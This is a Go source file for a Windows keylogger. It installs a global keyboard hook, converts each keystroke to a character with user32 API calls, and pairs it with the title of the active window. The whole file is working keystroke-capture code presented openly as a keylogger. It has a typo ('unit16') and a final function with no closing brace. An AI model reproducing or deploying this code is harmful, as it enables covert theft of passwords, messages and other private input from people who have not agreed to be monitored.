package keylogger 

import (
	"fmt"
    "os"
    "os/signal"

    "syscall"
    "unsafe"

    "github.com/moutend/go-hook/pkg/keyboard"
    "github.com/moutend/go-hook/pkg/types"
    "golang.org/x/sys/windows"
)

var (
	//set a mod user with the dynamic link library
	ariadne = windows.NewLazyDLL("user32.dll")
	// fetches keystate from os
	procGetKeyState         = ariadne.NewProc("GetKeyState")
   //fetches keyboard layout from os (syscall)
	procGetKeyboardLayout   = ariadne.NewProc("GetKeyboardLayout")
   //fetches keyboard state from os (syscall)
	procGetKeyboardState    = ariadne.NewProc("GetKeyboardState")
  // Translates the specified virtual-key code and keyboard state to the corresponding Unicode character or characters.
	procToUnicodeEx         = ariadne.NewProc("ToUnicodeEx")
   //gets the winodw's text
	procGetWindowText       = ariadne.NewProc("GetWindowTextW")
    //gets the window's text's lenght
	procGetWindowTextLength = ariadne.NewProc("GetWindowTextLengthW")

)

type (
    HANDLE uintptr
    HWND   HANDLE
)

func GetWindowTextLength(hwnd HWND) int{
	//grabs the window text length
	ret, _, _ := procGetWindowTextLength.Call(uintptr(hwnd))

	return int(ret)
}

func GetWindowText(hwnd HWND) string{
	//Gets the name of the window from winodws
	textLen := GetWindowTextLength(hwnd) +1

	buf := make([]unit16, textLen)
	procGetWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	return syscall.UTF16ToString(buf)
	
}

// Gets current foreground window
func GetForegroundWindow() uintptr {
    proc := ariadne.NewProc("GetForegroundWindow")
    hwnd, _, _ := proc.Call()
    return hwnd
}

func Run(key_out chan rune, window_out chan string) error {
    // Buffer size is depends on your need. The 100 is placeholder value.
    keyboardChan := make(chan types.KeyboardEvent, 1024)

    if err := keyboard.Install(nil, keyboardChan); err != nil {
        return err
    }

    defer keyboard.Uninstall()

    signalChan := make(chan os.Signal, 1)
    signal.Notify(signalChan, os.Interrupt)

    fmt.Println("start capturing keyboard input")

    for {
        select {
        case <-signalChan:
            fmt.Println("Received shutdown signal")
            return nil
        case k := <-keyboardChan:
            if hwnd := GetForegroundWindow(); hwnd != 0 {
                if k.Message == types.WM_KEYDOWN {
                    key_out <- VKCodeToAscii(k)
                    window_out <- GetWindowText(HWND(hwnd))
                }
            }
        }
    }
}

func VKCodeToAscii(k types.KeyboardEvent) rune {
    var buffer []uint16 = make([]uint16, 256)
    var keyState []byte = make([]byte, 256)

    n := 10
    n |= (1 << 2)

    procGetKeyState.Call(uintptr(k.VKCode))

    procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))
    r1, _, _ := procGetKeyboardLayout.Call(0)

    procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(&keyState[0])),
        uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n), r1)

    if len(syscall.UTF16ToString(buffer)) > 0 {
        return []rune(syscall.UTF16ToString(buffer))[0]
    }
    return rune(0)
